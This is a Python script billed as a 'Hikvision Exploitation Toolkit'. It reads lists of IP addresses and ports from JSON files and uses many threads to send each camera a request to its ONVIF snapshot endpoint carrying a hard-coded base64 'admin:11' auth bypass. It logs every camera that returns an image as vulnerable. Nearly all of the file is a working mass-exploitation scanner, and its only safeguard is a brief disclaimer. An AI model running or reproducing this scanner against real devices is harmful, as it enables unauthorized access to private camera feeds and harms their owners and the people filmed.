import json
import os
import base64
import requests
import logging
import time
import argparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Try importing pyfiglet for the fancy banner
try:
    from pyfiglet import Figlet
except ImportError:
    print("[WARNING] pyfiglet not installed. Run 'pip install pyfiglet' for banner support.\n")

############################
# ANSI color codes         #
############################

RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

############################
# Banner + Colors          #
############################

def print_banner():
    """Displays a fancy ASCII banner using pyfiglet."""
    try:
        f = Figlet(font="slant")
        banner_text = f.renderText("Hikvision Exploit")
        print(f"{CYAN}{banner_text}{RESET}")
    except NameError:
        # If pyfiglet isn't installed, just print a simple banner
        print("Hikvision Exploit")

    print("=" * 80)
    print(f"{CYAN}  Hikvision Exploitation Toolkit - Red Team Edition {RESET}")
    print(f"{CYAN}  Made by #AfterDark {RESET}")
    print("=" * 80)
    print(f"{YELLOW}[!] DISCLAIMER: This tool is for authorized testing only. {RESET}")
    print(f"{YELLOW}    The author assumes no liability for misuse. {RESET}")
    print("=" * 80)

def color_print(message, level="info"):
    """
    Print a message with a color determined by 'level'.
    - level='info' -> CYAN
    - level='warning' -> YELLOW
    - level='error' -> RED
    - level='success' -> GREEN
    """
    if level == "info":
        color = CYAN
    elif level == "warning":
        color = YELLOW
    elif level == "error":
        color = RED
    elif level == "success":
        color = GREEN
    else:
        color = RESET
    print(f"{color}{message}{RESET}")

############################
# JSON + File I/O Helpers  #
############################

def prompt_for_json_file():
    """Prompt user for JSON file location and validate it."""
    while True:
        file_path = input("Enter the path to the JSON file: ").strip()
        if not os.path.isfile(file_path):
            color_print("[ERROR] File does not exist. Please try again.", level="error")
        else:
            return file_path

def load_json(file_path):
    """Load and parse the JSON file line by line (JSON lines)."""
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            # Each line should be a valid JSON object
            data = [json.loads(line) for line in file if line.strip()]
            return data
    except json.JSONDecodeError as e:
        color_print(f"[ERROR] Failed to parse JSON: {e}", level="error")
        return None
    except Exception as e:
        color_print(f"[ERROR] Unexpected error: {e}", level="error")
        return None

###########################
# Ports + IP Extraction   #
###########################

def extract_ports(port_field):
    """
    Return a list of integer ports from the 'port' field.
    The field might be:
    - An integer (e.g. 443)
    - A string with comma-separated ports (e.g. '443,8053')
    - A list of integers
    """
    if port_field is None:
        return []
    # If it's already an integer, wrap in a list
    if isinstance(port_field, int):
        return [port_field]
    # If it's a list, assume it contains integer(s)
    if isinstance(port_field, list):
        results = []
        for p in port_field:
            try:
                results.append(int(p))
            except ValueError:
                pass
        return results
    # If it's a string, check if it's comma-separated
    if isinstance(port_field, str):
        split_ports = port_field.split(",")
        results = []
        for p in split_ports:
            p = p.strip()
            if p.isdigit():
                results.append(int(p))
        return results
    return []

def extract_unique_ip_port_pairs(json_data):
    """
    Extract all (IP, Port) pairs from the JSON.
    If 'port' is multiple, we'll produce multiple pairs.
    """
    unique_targets = set()
    for entry in json_data:
        ip = entry.get("ip")
        ports = extract_ports(entry.get("port"))
        if not ip or not ports:
            continue
        for p in ports:
            unique_targets.add((ip, p))
    return list(unique_targets)

############################
# Vulnerability Check      #
############################

def check_vulnerability(ip, port, max_retries=1, timeout=4):
    """
    Check if the Hikvision camera is vulnerable, with retry logic and User-Agent header.
    Lower max_retries and shorter timeout => faster scanning.
    """
    snapshot_path = "/onvif-http/snapshot"
    auth_param = f"?auth={base64.b64encode(b'admin:11').decode()}"
    url = f"http://{ip}:{port}{snapshot_path}{auth_param}"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

    for attempt in range(1, max_retries + 1):
        try:
            response = requests.get(url, headers=headers, timeout=timeout)
            if response.status_code == 200 and "image" in response.headers.get("Content-Type", "").lower():
                return True, f"Vulnerable Hikvision Camera: {url}"
            elif response.status_code == 401:
                return False, "[SECURE] Authentication required."
            else:
                return False, f"[UNKNOWN] Unexpected response ({response.status_code})."
        except requests.exceptions.ReadTimeout:
            color_print(f"[WARNING] Timeout on {ip}:{port}, attempt {attempt}/{max_retries}", level="warning")
        except requests.exceptions.ConnectionError as e:
            color_print(f"[WARNING] Connection error on {ip}:{port}, attempt {attempt}/{max_retries} - {e}", level="warning")
        except Exception as e:
            return False, f"[ERROR] Unexpected error: {e}"

        time.sleep(0.2)  # short delay before retry

    return False, "[ERROR] Maximum retry attempts reached. Connection failed."

############################
# Logging + Output         #
############################

def setup_logging():
    """Set up logging to a file."""
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    log_filename = f"hikvision_scan_{timestamp}.log"
    failed_log_filename = f"failed_connections_{timestamp}.log"
    logging.basicConfig(
        filename=log_filename,
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    return log_filename, failed_log_filename

def save_results(file_path, results):
    """Save the scan results to a file."""
    with open(file_path, "w") as f:
        for result in results:
            f.write(result + "\n")

############################
# Multithreaded Scanning   #
############################

def process_target(ip, port, results, failed_connections):
    vulnerable, message = check_vulnerability(ip, port)
    # Colorize output depending on status
    if vulnerable:
        color_print(f"[*] {ip}:{port} - {message}", level="success")
        results.append(message)
    elif "[SECURE]" in message or "[UNKNOWN]" in message:
        color_print(f"[*] {ip}:{port} - {message}", level="warning")
        failed_connections.append(f"{ip}:{port} - {message}")
    elif "[ERROR]" in message:
        color_print(f"[*] {ip}:{port} - {message}", level="error")
        failed_connections.append(f"{ip}:{port} - {message}")
    else:
        # fallback default
        color_print(f"[*] {ip}:{port} - {message}")
        failed_connections.append(f"{ip}:{port} - {message}")

    # Also log to the .log file
    logging.info(f"{ip}:{port} - {message}")

def main():
    parser = argparse.ArgumentParser(description="Hikvision Camera Exploit Scanner")
    parser.add_argument("-f", "--file", help="Path to JSON file containing IP/Port data")
    parser.add_argument("-o", "--output", help="Output file name for results", default="hikvision_scan_results.txt")
    parser.add_argument("-t", "--threads", help="Number of threads to use", type=int, default=20)
    args = parser.parse_args()

    print_banner()

    log_file, failed_log_file = setup_logging()
    color_print(f"[INFO] Logging results to {log_file}", level="info")

    # If user didn't provide a file via CLI, prompt for it
    if args.file:
        file_path = args.file
        if not os.path.isfile(file_path):
            color_print(f"[ERROR] File does not exist: {file_path}", level="error")
            return
    else:
        file_path = prompt_for_json_file()

    json_data = load_json(file_path)
    if not json_data:
        return

    # Build the IP/Port pairs
    targets = extract_unique_ip_port_pairs(json_data)
    if not targets:
        color_print("[ERROR] No valid IPs and Ports found in JSON.", level="error")
        return

    color_print(f"\n[INFO] Starting scan on {len(targets)} targets (threads={args.threads})...\n", level="info")
    results = []
    failed_connections = []

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for (ip, port) in targets:
            executor.submit(process_target, ip, port, results, failed_connections)

    # Use the user-supplied output file
    output_file = args.output
    save_results(output_file, results)
    save_results(failed_log_file, failed_connections)

    color_print(f"\n[INFO] Scan complete. Results saved to {output_file}", level="info")
    color_print(f"[INFO] Failed connections saved to {failed_log_file}", level="info")
    color_print(f"[INFO] {len(results)} cameras found vulnerable, {len(failed_connections)} connections failed.", level="info")

if __name__ == "__main__":
    main()
